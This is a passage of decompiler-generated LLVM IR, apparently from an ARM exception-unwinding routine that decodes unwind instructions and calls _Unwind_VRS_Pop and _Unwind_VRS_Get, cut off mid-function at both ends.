  %v4_229ec = add i32 %v3_229e8, 4
  store i32 %v4_229ec, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_229ec, i32* %v2_229e8, align 4
  %v0_229f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_229f8 = trunc i32 %v0_229f8 to i8
  %v2_229f8 = load i32, i32* @r5, align 4
  %v3_229f8 = add i32 %v2_229f8, 8
  %v4_229f8 = inttoptr i32 %v3_229f8 to i8*
  store i8 %v1_229f8, i8* %v4_229f8, align 1
  %v0_229fc = load i32, i32* %r0.global-to-local, align 4
  %v1_229fc = load i32, i32* @r5, align 4
  %v2_229fc = inttoptr i32 %v1_229fc to i32*
  store i32 %v0_229fc, i32* %v2_229fc, align 4
  br label %dec_label_pc_22a00

dec_label_pc_22a00:                               ; preds = %.thread30, %dec_label_pc_229e0
  %v0_22a00 = load i32, i32* %r0.global-to-local, align 4
  %v3_22a00 = udiv i32 %v0_22a00, 16777216
  %v1_22a04 = urem i32 %v3_22a00, 16
  %v3_22a08 = mul i32 %v0_22a00, 256
  store i32 %v3_22a08, i32* %r0.global-to-local, align 4
  %v1_22a0c = add nuw nsw i32 %v1_22a04, 1
  store i32 %v1_22a0c, i32* %r2.global-to-local, align 4
  %v1_22a10 = and i32 %v3_22a00, 240
  store i32 %v1_22a10, i32* %r3.global-to-local, align 4
  %v1_22a14 = load i32, i32* @r5, align 4
  %v2_22a14 = inttoptr i32 %v1_22a14 to i32*
  store i32 %v3_22a08, i32* %v2_22a14, align 4
  %v0_22a18 = load i32, i32* %r2.global-to-local, align 4
  %v1_22a18 = load i32, i32* %r3.global-to-local, align 4
  %v4_22a18 = mul i32 %v1_22a18, 4096
  %v5_22a18 = or i32 %v4_22a18, %v0_22a18
  br label %dec_label_pc_22a1c

dec_label_pc_22a1c:                               ; preds = %dec_label_pc_229cc, %dec_label_pc_22a00
  %storemerge132 = phi i32 [ %v5_22a18, %dec_label_pc_22a00 ], [ 720897, %dec_label_pc_229cc ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2293c

dec_label_pc_22a24:                               ; preds = %dec_label_pc_229b0
  %v1_22a24 = and i32 %v0_22694, 252
  store i32 %v1_22a24, i32* %r3.global-to-local, align 4
  %v7_22a28 = icmp eq i32 %v1_22a24, 180
  store i1 %v7_22a28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22a28, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_22a24
  %v2_22a2c = urem i32 %v0_22694, 4
  %v2_22a34 = add nuw nsw i32 %v2_22a2c, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_22a40 = or i32 %v2_22a34, 262144
  store i32 %v2_22a40, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2293c

bb157:                                            ; preds = %dec_label_pc_22a24
  %v2_22a30 = urem i32 %v0_229a0, 8
  %v2_22a38 = add nuw nsw i32 %v2_22a30, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_22a48 = or i32 %v2_22a38, 524288
  store i32 %v2_22a48, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2293c

dec_label_pc_22a50:                               ; preds = %dec_label_pc_22960
  %v0_22a50 = load i32, i32* %ip.global-to-local, align 4
  %v7_22a50 = icmp eq i32 %v0_22a50, 198
  store i1 %v7_22a50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22a50, label %dec_label_pc_22a58, label %dec_label_pc_2285c

dec_label_pc_22a58:                               ; preds = %dec_label_pc_22a50
  %v0_22a58 = load i32, i32* @r5, align 4
  %v1_22a58 = add i32 %v0_22a58, 8
  %v2_22a58 = inttoptr i32 %v1_22a58 to i8*
  %v3_22a58 = load i8, i8* %v2_22a58, align 1
  %v4_22a58 = zext i8 %v3_22a58 to i32
  store i32 %v4_22a58, i32* %r3.global-to-local, align 4
  %v2_22a5c = icmp eq i8 %v3_22a58, 0
  store i1 %v2_22a5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22a5c, label %dec_label_pc_22a6c, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_22a58
  %v2_22a60 = add nsw i32 %v4_22a58, -1
  store i32 %v2_22a60, i32* %r3.global-to-local, align 4
  %v2_22a64 = trunc i32 %v2_22a60 to i8
  store i8 %v2_22a64, i8* %v2_22a58, align 1
  %v0_22a68.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_22a68.pr.pr, label %.thread48.dec_label_pc_22a6c_crit_edge, label %dec_label_pc_22aa0

.thread48.dec_label_pc_22a6c_crit_edge:           ; preds = %.thread48
  %v0_22a6c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_22a6c

dec_label_pc_22a6c:                               ; preds = %.thread48.dec_label_pc_22a6c_crit_edge, %dec_label_pc_22a58
  %v2_22a84 = phi i32 [ %v0_22a6c.pre, %.thread48.dec_label_pc_22a6c_crit_edge ], [ %v0_22a58, %dec_label_pc_22a58 ]
  %v1_22a6c = add i32 %v2_22a84, 9
  %v2_22a6c = inttoptr i32 %v1_22a6c to i8*
  %v3_22a6c = load i8, i8* %v2_22a6c, align 1
  %v4_22a6c = zext i8 %v3_22a6c to i32
  store i32 %v4_22a6c, i32* %r3.global-to-local, align 4
  %v2_22a70 = icmp eq i8 %v3_22a6c, 0
  store i1 %v2_22a70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22a70, label %dec_label_pc_22abc, label %dec_label_pc_22a80

dec_label_pc_22a80:                               ; preds = %dec_label_pc_22a6c
  %v1_22a80 = add nsw i32 %v4_22a6c, -1
  store i32 %v1_22a80, i32* %r3.global-to-local, align 4
  %v1_22a84 = trunc i32 %v1_22a80 to i8
  store i8 %v1_22a84, i8* %v2_22a6c, align 1
  %v0_22a88 = load i32, i32* @r5, align 4
  %v1_22a88 = add i32 %v0_22a88, 4
  %v2_22a88 = inttoptr i32 %v1_22a88 to i32*
  %v3_22a88 = load i32, i32* %v2_22a88, align 4
  store i32 %v3_22a88, i32* %r2.global-to-local, align 4
  %v1_22a8c = inttoptr i32 %v3_22a88 to i32*
  %v2_22a8c = load i32, i32* %v1_22a8c, align 4
  store i32 %v2_22a8c, i32* %r0.global-to-local, align 4
  %v4_22a8c = add i32 %v3_22a88, 4
  store i32 %v4_22a8c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_22a8c, i32* %v2_22a88, align 4
  %v0_22a98 = load i32, i32* %r3.global-to-local, align 4
  %v1_22a98 = trunc i32 %v0_22a98 to i8
  %v2_22a98 = load i32, i32* @r5, align 4
  %v3_22a98 = add i32 %v2_22a98, 8
  %v4_22a98 = inttoptr i32 %v3_22a98 to i8*
  store i8 %v1_22a98, i8* %v4_22a98, align 1
  %v0_22a9c = load i32, i32* %r0.global-to-local, align 4
  %v1_22a9c = load i32, i32* @r5, align 4
  %v2_22a9c = inttoptr i32 %v1_22a9c to i32*
  store i32 %v0_22a9c, i32* %v2_22a9c, align 4
  br label %dec_label_pc_22aa0

dec_label_pc_22aa0:                               ; preds = %.thread48, %dec_label_pc_22a80
  %v0_22aa0 = load i32, i32* %r0.global-to-local, align 4
  %v3_22aa0 = udiv i32 %v0_22aa0, 16777216
  %v1_22aa4 = urem i32 %v3_22aa0, 16
  %v3_22aa8 = mul i32 %v0_22aa0, 256
  store i32 %v3_22aa8, i32* %r0.global-to-local, align 4
  %v1_22aac = add nuw nsw i32 %v1_22aa4, 1
  store i32 %v1_22aac, i32* %r2.global-to-local, align 4
  %v1_22ab0 = and i32 %v3_22aa0, 240
  store i32 %v1_22ab0, i32* %r3.global-to-local, align 4
  %v1_22ab4 = load i32, i32* @r5, align 4
  %v2_22ab4 = inttoptr i32 %v1_22ab4 to i32*
  store i32 %v3_22aa8, i32* %v2_22ab4, align 4
  %v0_22ab8 = load i32, i32* %r2.global-to-local, align 4
  %v1_22ab8 = load i32, i32* %r3.global-to-local, align 4
  %v4_22ab8 = mul i32 %v1_22ab8, 4096
  %v5_22ab8 = or i32 %v4_22ab8, %v0_22ab8
  br label %dec_label_pc_22abc

dec_label_pc_22abc:                               ; preds = %dec_label_pc_22a6c, %dec_label_pc_22aa0
  %storemerge131 = phi i32 [ %v5_22ab8, %dec_label_pc_22aa0 ], [ 720897, %dec_label_pc_22a6c ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2293c

dec_label_pc_22ac4:                               ; preds = %dec_label_pc_22880
  %v0_22ac4 = load i32, i32* @r5, align 4
  %v1_22ac4 = add i32 %v0_22ac4, 8
  %v2_22ac4 = inttoptr i32 %v1_22ac4 to i8*
  %v3_22ac4 = load i8, i8* %v2_22ac4, align 1
  %v4_22ac4 = zext i8 %v3_22ac4 to i32
  store i32 %v4_22ac4, i32* %r3.global-to-local, align 4
  %v2_22ac8 = icmp eq i8 %v3_22ac4, 0
  store i1 %v2_22ac8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22ac8, label %dec_label_pc_22ad8, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_22ac4
  %v2_22acc = add nsw i32 %v4_22ac4, -1
  store i32 %v2_22acc, i32* %r3.global-to-local, align 4
  %v2_22ad0 = trunc i32 %v2_22acc to i8
  store i8 %v2_22ad0, i8* %v2_22ac4, align 1
  %v0_22ad4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_22ad4.pr.pr, label %.thread52.dec_label_pc_22ad8_crit_edge, label %dec_label_pc_22b0c

.thread52.dec_label_pc_22ad8_crit_edge:           ; preds = %.thread52
  %v0_22ad8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_22ad8

dec_label_pc_22ad8:                               ; preds = %.thread52.dec_label_pc_22ad8_crit_edge, %dec_label_pc_22ac4
  %v2_22af0 = phi i32 [ %v0_22ad8.pre, %.thread52.dec_label_pc_22ad8_crit_edge ], [ %v0_22ac4, %dec_label_pc_22ac4 ]
  %v1_22ad8 = add i32 %v2_22af0, 9
  %v2_22ad8 = inttoptr i32 %v1_22ad8 to i8*
  %v3_22ad8 = load i8, i8* %v2_22ad8, align 1
  %v4_22ad8 = zext i8 %v3_22ad8 to i32
  store i32 %v4_22ad8, i32* %r3.global-to-local, align 4
  %v2_22adc = icmp eq i8 %v3_22ad8, 0
  store i1 %v2_22adc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22adc, label %dec_label_pc_22b28, label %dec_label_pc_22aec

dec_label_pc_22aec:                               ; preds = %dec_label_pc_22ad8
  %v1_22aec = add nsw i32 %v4_22ad8, -1
  store i32 %v1_22aec, i32* %r3.global-to-local, align 4
  %v1_22af0 = trunc i32 %v1_22aec to i8
  store i8 %v1_22af0, i8* %v2_22ad8, align 1
  %v0_22af4 = load i32, i32* @r5, align 4
  %v1_22af4 = add i32 %v0_22af4, 4
  %v2_22af4 = inttoptr i32 %v1_22af4 to i32*
  %v3_22af4 = load i32, i32* %v2_22af4, align 4
  store i32 %v3_22af4, i32* %r2.global-to-local, align 4
  %v1_22af8 = inttoptr i32 %v3_22af4 to i32*
  %v2_22af8 = load i32, i32* %v1_22af8, align 4
  store i32 %v2_22af8, i32* %r0.global-to-local, align 4
  %v4_22af8 = add i32 %v3_22af4, 4
  store i32 %v4_22af8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_22af8, i32* %v2_22af4, align 4
  %v0_22b04 = load i32, i32* %r3.global-to-local, align 4
  %v1_22b04 = trunc i32 %v0_22b04 to i8
  %v2_22b04 = load i32, i32* @r5, align 4
  %v3_22b04 = add i32 %v2_22b04, 8
  %v4_22b04 = inttoptr i32 %v3_22b04 to i8*
  store i8 %v1_22b04, i8* %v4_22b04, align 1
  %v0_22b08 = load i32, i32* %r0.global-to-local, align 4
  %v1_22b08 = load i32, i32* @r5, align 4
  %v2_22b08 = inttoptr i32 %v1_22b08 to i32*
  store i32 %v0_22b08, i32* %v2_22b08, align 4
  br label %dec_label_pc_22b0c

dec_label_pc_22b0c:                               ; preds = %.thread52, %dec_label_pc_22aec
  %v0_22b0c = load i32, i32* %r0.global-to-local, align 4
  %v3_22b0c = udiv i32 %v0_22b0c, 16777216
  %v1_22b10 = urem i32 %v3_22b0c, 16
  %v3_22b14 = mul i32 %v0_22b0c, 256
  store i32 %v3_22b14, i32* %r0.global-to-local, align 4
  %v1_22b18 = add nuw nsw i32 %v1_22b10, 1
  store i32 %v1_22b18, i32* %r2.global-to-local, align 4
  %v1_22b1c = and i32 %v3_22b0c, 240
  store i32 %v1_22b1c, i32* %r3.global-to-local, align 4
  %v1_22b20 = load i32, i32* @r5, align 4
  %v2_22b20 = inttoptr i32 %v1_22b20 to i32*
  store i32 %v3_22b14, i32* %v2_22b20, align 4
  %v0_22b24 = load i32, i32* %r2.global-to-local, align 4
  %v1_22b24 = load i32, i32* %r3.global-to-local, align 4
  %v4_22b24 = mul i32 %v1_22b24, 4096
  %v5_22b24 = or i32 %v4_22b24, %v0_22b24
  br label %dec_label_pc_22b28

dec_label_pc_22b28:                               ; preds = %dec_label_pc_22ad8, %dec_label_pc_22b0c
  %storemerge130 = phi i32 [ %v5_22b24, %dec_label_pc_22b0c ], [ 720897, %dec_label_pc_22ad8 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2293c

dec_label_pc_22b30:                               ; preds = %dec_label_pc_2285c
  %v0_22b30 = load i32, i32* @r5, align 4
  %v1_22b30 = add i32 %v0_22b30, 8
  %v2_22b30 = inttoptr i32 %v1_22b30 to i8*
  %v3_22b30 = load i8, i8* %v2_22b30, align 1
  %v4_22b30 = zext i8 %v3_22b30 to i32
  store i32 %v4_22b30, i32* %r3.global-to-local, align 4
  %v2_22b34 = icmp eq i8 %v3_22b30, 0
  store i1 %v2_22b34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22b34, label %dec_label_pc_22cdc, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_22b30
  %v2_22b38 = add nsw i32 %v4_22b30, -1
  store i32 %v2_22b38, i32* %r3.global-to-local, align 4
  %v2_22b3c = trunc i32 %v2_22b38 to i8
  store i8 %v2_22b3c, i8* %v2_22b30, align 1
  %v0_22b40.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_22b40.pr.pr, label %.thread56.dec_label_pc_22cdc_crit_edge, label %dec_label_pc_22b44

.thread56.dec_label_pc_22cdc_crit_edge:           ; preds = %.thread56
  %v0_22cdc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_22cdc

dec_label_pc_22b44:                               ; preds = %.thread56, %dec_label_pc_22ce8
  %v0_22b44 = load i32, i32* %r0.global-to-local, align 4
  %v3_22b44 = udiv i32 %v0_22b44, 16777216
  store i32 %v3_22b44, i32* %r3.global-to-local, align 4
  store i32 %v3_22b44, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_22b44, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_22b4c = mul i32 %v0_22b44, 256
  store i32 %v3_22b4c, i32* %r0.global-to-local, align 4
  %v1_22b50 = load i32, i32* @r5, align 4
  %v2_22b50 = inttoptr i32 %v1_22b50 to i32*
  store i32 %v3_22b4c, i32* %v2_22b50, align 4
  br i1 %tmp184, label %dec_label_pc_2290c, label %dec_label_pc_22b58

dec_label_pc_22b58:                               ; preds = %dec_label_pc_22b44
  %v0_22b58 = load i32, i32* %r3.global-to-local, align 4
  %v1_22b58 = and i32 %v0_22b58, 240
  store i32 %v1_22b58, i32* %r3.global-to-local, align 4
  %v2_22b58 = icmp eq i32 %v1_22b58, 0
  store i1 %v2_22b58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22b58, label %dec_label_pc_22b60, label %dec_label_pc_2290c

dec_label_pc_22b60:                               ; preds = %dec_label_pc_22b58
  %v0_22b60 = load i32, i32* @r7, align 4
  store i32 %v0_22b60, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_22b68 = load i32, i32* %r2.global-to-local, align 4
  %v4_22b68 = call i32 @_Unwind_VRS_Pop(i32 %v0_22b60, i32 4, i32 %v2_22b68, i32 0)
  store i32 %v4_22b68, i32* %r0.global-to-local, align 4
  %v2_22b6c = icmp eq i32 %v4_22b68, 0
  store i1 %v2_22b6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22b6c, label %dec_label_pc_2263c.backedge, label %dec_label_pc_22b74

dec_label_pc_22b74:                               ; preds = %dec_label_pc_22b60
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22764

dec_label_pc_22b7c:                               ; preds = %dec_label_pc_229a8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_22b88 = load i32, i32* @r7, align 4
  store i32 %v0_22b88, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_22b94 = call i32 @_Unwind_VRS_Get(i32 %v0_22b88, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_22b94, i32* %r0.global-to-local, align 4
  %v0_22b98 = load i32, i32* @r5, align 4
  %v1_22b98 = add i32 %v0_22b98, 8
  %v2_22b98 = inttoptr i32 %v1_22b98 to i8*
  %v3_22b98 = load i8, i8* %v2_22b98, align 1
  %v4_22b98 = zext i8 %v3_22b98 to i32
  store i32 %v4_22b98, i32* %r1.global-to-local, align 4
  %v2_22b9c = icmp eq i8 %v3_22b98, 0
  store i1 %v2_22b9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22b9c, label %dec_label_pc_22bac, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_22b7c
  %v2_22ba0 = add nsw i32 %v4_22b98, -1
  store i32 %v2_22ba0, i32* %r3.global-to-local, align 4
  %v2_22ba4 = trunc i32 %v2_22ba0 to i8
  store i8 %v2_22ba4, i8* %v2_22b98, align 1
  %v0_22ba8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_22ba8.pr.pr, label %.thread58.dec_label_pc_22bac_crit_edge, label %dec_label_pc_22bd8

.thread58.dec_label_pc_22bac_crit_edge:           ; preds = %.thread58
  %v0_22bac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_22bac

dec_label_pc_22bac:                               ; preds = %.thread58.dec_label_pc_22bac_crit_edge, %dec_label_pc_22b7c
  %v2_22bc0 = phi i32 [ %v0_22bac.pre, %.thread58.dec_label_pc_22bac_crit_edge ], [ %v0_22b98, %dec_label_pc_22b7c ]
  %v1_22bac = add i32 %v2_22bc0, 9
  %v2_22bac = inttoptr i32 %v1_22bac to i8*
  %v3_22bac = load i8, i8* %v2_22bac, align 1
  %v4_22bac = zext i8 %v3_22bac to i32
  store i32 %v4_22bac, i32* %r3.global-to-local, align 4
  %v2_22bb0 = icmp eq i8 %v3_22bac, 0
  store i1 %v2_22bb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22bb0, label %bb158, label %dec_label_pc_22bbc

bb158:                                            ; preds = %dec_label_pc_22bac
  %v1_22bb4 = load i32, i32* @r6, align 4
  store i32 %v1_22bb4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_22c00

dec_label_pc_22bbc:                               ; preds = %dec_label_pc_22bac
  %v1_22bbc = add nsw i32 %v4_22bac, -1
  store i32 %v1_22bbc, i32* %r3.global-to-local, align 4
  %v1_22bc0 = trunc i32 %v1_22bbc to i8
  store i8 %v1_22bc0, i8* %v2_22bac, align 1
  %v0_22bc4 = load i32, i32* @r5, align 4
  %v1_22bc4 = add i32 %v0_22bc4, 4
  %v2_22bc4 = inttoptr i32 %v1_22bc4 to i32*
  %v3_22bc4 = load i32, i32* %v2_22bc4, align 4
  store i32 %v3_22bc4, i32* %r2.global-to-local, align 4
  %v1_22bc8 = inttoptr i32 %v3_22bc4 to i32*
  %v2_22bc8 = load i32, i32* %v1_22bc8, align 4
  store i32 %v2_22bc8, i32* %r0.global-to-local, align 4
  %v4_22bc8 = add i32 %v3_22bc4, 4
  store i32 %v4_22bc8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_22bd0 = inttoptr i32 %v0_22bc4 to i32*
  store i32 %v2_22bc8, i32* %v1_22bd0, align 4
  %v5_22bd0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_22bd0, i32* %v2_22bc4, align 4
  %v0_22bd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_22bd4 = trunc i32 %v0_22bd4 to i8
  %v2_22bd4 = load i32, i32* @r5, align 4
  %v3_22bd4 = add i32 %v2_22bd4, 8
  %v4_22bd4 = inttoptr i32 %v3_22bd4 to i8*
  store i8 %v1_22bd4, i8* %v4_22bd4, align 1
  br label %dec_label_pc_22bd8

dec_label_pc_22bd8:                               ; preds = %.thread58, %dec_label_pc_22bbc
  %v0_22bd8 = load i32, i32* @r5, align 4
  %v1_22bd8 = inttoptr i32 %v0_22bd8 to i32*
  %v2_22bd8 = load i32, i32* %v1_22bd8, align 4
  store i32 %v2_22bd8, i32* %r3.global-to-local, align 4
  %v3_22bdc = mul i32 %v2_22bd8, 256
  store i32 %v3_22bdc, i32* %r0.global-to-local, align 4
  %v3_22be0 = udiv i32 %v2_22bd8, 16777216
  store i32 %v3_22be0, i32* %r2.global-to-local, align 4
  store i32 %v3_22bdc, i32* %v1_22bd8, align 4
  %v0_22be8 = load i32, i32* %r2.global-to-local, align 4
  %v1_22be8 = and i32 %v0_22be8, 128
  %v2_22be8 = icmp eq i32 %v1_22be8, 0
  store i1 %v2_22be8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22be8, label %.thread129, label %dec_label_pc_22bfc

.thread129:                                       ; preds = %dec_label_pc_22bd8
  %v4_22bec = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_22bec, i32* %ip.global-to-local, align 4
  %v1_22bf0 = urem i32 %v0_22be8, 256
  store i32 %v1_22bf0, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_22c70

dec_label_pc_22bfc:                               ; preds = %dec_label_pc_22bd8
  %v1_22bf063 = urem i32 %v0_22be8, 256
  store i32 %v1_22bf063, i32* %r2.global-to-local, align 4
  %v0_22bfc = load i32, i32* @r5, align 4
  %v1_22bfc = add i32 %v0_22bfc, 8
  %v2_22bfc = inttoptr i32 %v1_22bfc to i8*
  %v3_22bfc = load i8, i8* %v2_22bfc, align 1
  %v4_22bfc = zext i8 %v3_22bfc to i32
  store i32 %v4_22bfc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_22c00

dec_label_pc_22c00:                               ; preds = %bb158, %dec_label_pc_22bfc
  %v3_22c2099 = phi i32 [ %v2_22bc0, %bb158 ], [ %v0_22bfc, %dec_label_pc_22bfc ]
  %v0_22c0892 = phi i32 [ %v1_22bb4, %bb158 ], [ %v1_22bf063, %dec_label_pc_22bfc ]
  %v3_22c00 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_22c00, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_22c08

dec_label_pc_22c08:                               ; preds = %dec_label_pc_22c08.backedge, %dec_label_pc_22c00
  %v3_22c20 = phi i32 [ %v3_22c20100, %dec_label_pc_22c08.backedge ], [ %v3_22c2099, %dec_label_pc_22c00 ]
  %v0_22c1c = phi i32 [ %v2_22c0c.pre, %dec_label_pc_22c08.backedge ], [ 2, %dec_label_pc_22c00 ]
  %v0_22c0c = phi i32 [ %v0_22c0c.pre, %dec_label_pc_22c08.backedge ], [ %v3_22c00, %dec_label_pc_22c00 ]
  %v0_22c08 = phi i32 [ %v0_22c0895, %dec_label_pc_22c08.backedge ], [ %v0_22c0892, %dec_label_pc_22c00 ]
  %v1_22c08 = urem i32 %v0_22c08, 128
  %v7_22c0c = shl i32 %v1_22c08, %v0_22c1c
  %v8_22c0c = add i32 %v7_22c0c, %v0_22c0c
  store i32 %v8_22c0c, i32* %ip.global-to-local, align 4
  %v0_22c10 = load i32, i32* %r1.global-to-local, align 4
  %v2_22c10 = icmp eq i32 %v0_22c10, 0
  store i1 %v2_22c10, i1* %cpsr_z.global-to-local, align 1
  %v1_22c14 = add i32 %v0_22c10, -1
  store i32 %v1_22c14, i32* %r3.global-to-local, align 4
  store i32 %v8_22c0c, i32* %stack_var_-36, align 4
  %v1_22c1c = add i32 %v0_22c1c, 7
  store i32 %v1_22c1c, i32* @lr, align 4
  br i1 %v2_22c10, label %dec_label_pc_22c28, label %bb159

bb159:                                            ; preds = %dec_label_pc_22c08
  %v2_22c20 = trunc i32 %v1_22c14 to i8
  %v4_22c20 = add i32 %v3_22c20, 8
  %v5_22c20 = inttoptr i32 %v4_22c20 to i8*
  store i8 %v2_22c20, i8* %v5_22c20, align 1
  %v0_22c24.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_22c24.pr, label %.dec_label_pc_22c28_crit_edge, label %dec_label_pc_22c54

.dec_label_pc_22c28_crit_edge:                    ; preds = %bb159
  %v0_22c28.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_22c28

dec_label_pc_22c28:                               ; preds = %.dec_label_pc_22c28_crit_edge, %dec_label_pc_22c08
  %v2_22c40 = phi i32 [ %v0_22c28.pre, %.dec_label_pc_22c28_crit_edge ], [ %v3_22c20, %dec_label_pc_22c08 ]
  %v1_22c28 = add i32 %v2_22c40, 9
  %v2_22c28 = inttoptr i32 %v1_22c28 to i8*
  %v3_22c28 = load i8, i8* %v2_22c28, align 1
  %v4_22c28 = zext i8 %v3_22c28 to i32
  store i32 %v4_22c28, i32* %r3.global-to-local, align 4
  %v2_22c2c = icmp eq i8 %v3_22c28, 0
  store i1 %v2_22c2c, i1* %cpsr_z.global-to-local, align 1
  %v1_22c30 = add nsw i32 %v4_22c28, -1
  store i32 %v1_22c30, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_22c2c, label %dec_label_pc_22c08.backedge, label %dec_label_pc_22c3c

dec_label_pc_22c3c:                               ; preds = %dec_label_pc_22c28
  %v1_22c3c = add i32 %v2_22c40, 4
  %v2_22c3c = inttoptr i32 %v1_22c3c to i32*
  %v3_22c3c = load i32, i32* %v2_22c3c, align 4
  store i32 %v3_22c3c, i32* %r2.global-to-local, align 4
  %v1_22c40 = trunc i32 %v1_22c30 to i8
  store i8 %v1_22c40, i8* %v2_22c28, align 1
  %v0_22c44 = load i32, i32* %r2.global-to-local, align 4
  %v1_22c44 = inttoptr i32 %v0_22c44 to i32*
  %v2_22c44 = load i32, i32* %v1_22c44, align 4
  store i32 %v2_22c44, i32* %r0.global-to-local, align 4
  %v4_22c44 = add i32 %v0_22c44, 4
  store i32 %v4_22c44, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_22c4c = load i32, i32* @r5, align 4
  %v3_22c4c = add i32 %v2_22c4c, 8
  %v4_22c4c = inttoptr i32 %v3_22c4c to i8*
  store i8 3, i8* %v4_22c4c, align 1
  %v0_22c50 = load i32, i32* @r5, align 4
  %v1_22c50 = inttoptr i32 %v0_22c50 to i32*
  %v2_22c50 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_22c50, i32* %v1_22c50, align 4
  %v3_22c50 = add i32 %v0_22c50, 4
  %v4_22c50 = inttoptr i32 %v3_22c50 to i32*
  %v5_22c50 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_22c50, i32* %v4_22c50, align 4
  br label %dec_label_pc_22c54

dec_label_pc_22c54:                               ; preds = %bb159, %dec_label_pc_22c3c
  %v0_22c54 = load i32, i32* @r5, align 4
  %v1_22c54 = inttoptr i32 %v0_22c54 to i32*
  %v2_22c54 = load i32, i32* %v1_22c54, align 4
  store i32 %v2_22c54, i32* %r3.global-to-local, align 4
  %v3_22c58 = udiv i32 %v2_22c54, 16777216
  store i32 %v3_22c58, i32* %r2.global-to-local, align 4
  %v1_22c5c = and i32 %v3_22c58, 128
  %v2_22c5c = icmp eq i32 %v1_22c5c, 0
  store i1 %v2_22c5c, i1* %cpsr_z.global-to-local, align 1
  %v3_22c60 = mul i32 %v2_22c54, 256
  store i32 %v3_22c60, i32* %r0.global-to-local, align 4
  store i32 %v3_22c60, i32* %v1_22c54, align 4
  %v0_22c68 = load i32, i32* %r2.global-to-local, align 4
  %v1_22c68 = urem i32 %v0_22c68, 256
  store i32 %v1_22c68, i32* %r2.global-to-local, align 4
  br i1 %v2_22c5c, label %dec_label_pc_22c70.loopexit, label %dec_label_pc_22c9c

dec_label_pc_22c70.loopexit:                      ; preds = %dec_label_pc_22c54
  %v0_22c74.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_22c78.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_22c70

dec_label_pc_22c70:                               ; preds = %dec_label_pc_22c70.loopexit, %.thread129
  %v2_22c78 = phi i32 [ 2, %.thread129 ], [ %v2_22c78.pre, %dec_label_pc_22c70.loopexit ]
  %v0_22c74 = phi i32 [ %v4_22bec, %.thread129 ], [ %v0_22c74.pre, %dec_label_pc_22c70.loopexit ]
  %v0_22c70 = phi i32 [ %v1_22bf0, %.thread129 ], [ %v1_22c68, %dec_label_pc_22c70.loopexit ]
  %v1_22c70 = urem i32 %v0_22c70, 128
  %v1_22c74 = add i32 %v0_22c74, 516
  %v7_22c78 = shl i32 %v1_22c70, %v2_22c78
  %v8_22c78 = add i32 %v1_22c74, %v7_22c78
